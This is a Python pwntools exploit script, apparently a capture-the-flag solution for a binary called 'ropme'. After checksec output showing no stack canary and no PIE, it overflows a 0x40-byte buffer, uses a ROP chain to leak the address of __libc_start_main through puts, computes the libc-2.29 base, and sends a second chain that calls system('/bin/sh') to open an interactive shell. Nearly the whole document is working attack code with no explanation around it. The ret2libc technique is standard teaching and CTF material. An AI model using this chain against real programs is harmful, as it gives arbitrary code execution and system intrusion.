"""
Run Checksec
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
"""
from pwn import *

bufferLen = 0x40
path = "./ropme"

context.log_level = 'debug'
context.binary = path

elf = ELF(path)
rop = ROP(elf)

# Leak __libc_start_main@@GLIBC_2.2.5
rop.raw(rop.generatePadding(0, bufferLen+elf.bytes))  
rop.call('puts', [elf.got['__libc_start_main']]) 
rop.call('main')

# The leak rop chain
print(rop.dump())

p = process(path)
p.sendlineafter("dah?", rop.chain())
p.recvline()

received = p.recvline().strip()
leak = u64(received.ljust(8, b"\x00"))
info("Libc: %s", hex(leak))

# Get System
libc = ELF("libc-2.29.so")
libc.address = leak - libc.sym['__libc_start_main']
info("Libc address %s ", hex(libc.address ))

binsh = next(libc.search(b"/bin/sh"))
rop2 = ROP(elf)
rop2.raw(rop2.generatePadding(0, bufferLen+8))  
rop2.call(libc.symbols['system'], [binsh])

# The system ROP chain
print(rop2.dump())
print(repr(rop2.chain()))

p.sendlineafter("dah?", rop2.chain())
p.interactive()
